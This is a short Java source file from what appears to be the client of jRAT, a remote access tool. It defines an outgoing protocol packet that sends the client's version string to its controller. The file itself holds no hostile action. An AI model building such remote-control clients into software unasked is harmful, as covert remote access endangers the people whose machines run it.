package jrat.client.packets.outgoing;

import jrat.client.Connection;
import jrat.common.Version;


public class Packet6InitVersion extends AbstractOutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		con.writeLine(Version.getVersion());
	}

	@Override
	public short getPacketId() {
		return (byte) 6;
	}

}
